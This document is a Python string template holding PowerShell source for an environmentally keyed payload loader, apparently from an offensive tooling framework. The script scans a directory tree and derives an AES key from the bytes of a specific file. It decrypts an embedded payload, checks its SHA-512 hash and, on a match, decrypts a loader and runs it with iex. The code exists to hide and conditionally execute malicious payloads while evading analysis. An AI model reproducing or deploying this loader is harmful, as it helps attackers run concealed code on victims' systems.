buildcode="""
# modified from https://gist.github.com/ctigeek/2a56648b923d198a6e60
function Get-AesManagedObject($key, $IV) {{
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.blocksize = 128
    $aesManaged.KeySize = 256
    if ($IV) {{
        if ($IV.getType().Name -eq "String") {{
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }}
        else {{
            $aesManaged.IV = $IV
        }}
    }}
    if ($key) {{
        if ($key.getType().Name -eq "String") {{
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }}
        else {{
            $aesManaged.Key = $key
        }}
    }}
    $aesManaged
}}

function Get-AesKey() {{
    $aesManaged = Get-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}}

function Get-DecryptedString($key, $encryptedStringWithIV) {{
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    #$bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Get-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    #[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
    return $unencryptedData
}}

function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{
    $sha512 = new-Object System.Security.Cryptography.SHA512Managed
    $end = $payload.Length - $minus_bytes -1
        
    if ([System.BitConverter]::ToString($sha512.ComputeHash($payload[0..$end])).ToLower().Replace("-", "").Equals($payload_hash)) {{
        return 1
    }} Else {{
        return 0
    }}
}}

function Get-CodeExecution($key, $payload){{
	$encryptedString = "{3}"
	$decrypted_loader = Get-DecryptedString $key $encryptedString
    $decoded_loader = [System.Text.Encoding]::ASCII.GetString($decrypted_loader).Trim([char]0)
    iex $decoded_loader
}}

function Get-R-Done($some_dir, $encrypted_msg, $payload_hash, $minus_bytes, $location, $key_len, $key_iterations){{
	$iteration_temp = $key_iterations
    $iteration_temp
        
	# open file
	"Where", $some_dir
	try {{
		$read_file = [System.IO.File]::ReadAllBytes($some_dir)
		$keyvalue = $read_file[$location..($location + $key_len - 1)]
		$sha512 = new-Object System.Security.Cryptography.SHA512Managed
    	
	}} Catch {{
		return 0
	}}
	
	while ($iteration_temp -ne 1){{
            $keyvalue = $sha512.ComputeHash($keyvalue)
            $iteration_temp--
    }}
    
    $keyvalue = $sha512.ComputeHash($keyvalue)
    $keyvalue = [System.Convert]::ToBase64String($keyvalue[0..31])
    "Keyvalue", $keyvalue
    
    try {{
        	$payload = Get-DecryptedString $keyvalue $encrypted_msg
        	$result = Get-CheckHash $payload $payload_hash $minus_bytes
        
    }} Catch {{
       $result = 0
    }}

    if ($result -eq 1){{
        "hashes match"
        Get-CodeExecution $keyvalue $payload
    }}
           
}}

function Get-Walk-OS($encrypted_msg, $payload_hash, $minus_bytes, $scan_dir, $key_iterations, $location, $key_len){{
	$dir_parsing = get-childitem $scan_dir -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
	[Environment]::Is64BitProcess
	#Select-String -Pattern sysnative
	$sys_paths = @("c:\", "c:\windows", "c:\windows\system32")
	
	if ([Environment]::Is64BitProcess -eq 0 -And $sys_paths -contains $scan_dir) {{ # Is a 32bit process
		$dir_parsing += get-childitem "\Windows\sysnative\" -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
	}} 

	foreach ($some_dir in $dir_parsing){{
		if ((Get-Item $some_dir) -isnot [System.IO.DirectoryInfo]){{
			Get-R-Done $some_dir $encrypted_msg $payload_hash $minus_bytes $location $key_len $key_iterations
		}}
	}}
}}

	$lookup_table = [System.Convert]::FromBase64String("{0}")
	$lookup_table.GetType()
	$payload_hash = "{1}"
	$minus_bytes = {2}
	$scan_dir = "{4}"
	$key_iterations = {5}
	#$location = $lookup_table[0..3]
	#[System.Array]::Reverse($location) # struct.unpack("<I", self.lookup_table[0:4])[0]
	$lookup_table[0..3]
	$location = [bitconverter]::ToInt32($lookup_table[0..3], 0)
	$key_len =  [bitconverter]::ToInt16($lookup_table[4..5], 0)
	
	#[System.Array]::Reverse($lookup_table[4..5]) # struct.unpack("<H", self.lookup_table[4:6])[0]
	"location", $location
	"key_len", $key_len
	$encrypted_msg = [System.Text.Encoding]::ASCII.GetString($lookup_table[6..$lookup_table.Length])
	#$encrypted_msg
	if ($scan_dir.Contains("%")){{
		$scan_dir = [Environment]::GetEnvironmentVariable($scan_dir -replace "%")
	}}

	Get-Walk-OS $encrypted_msg $payload_hash $minus_bytes $scan_dir $key_iterations $location $key_len


"""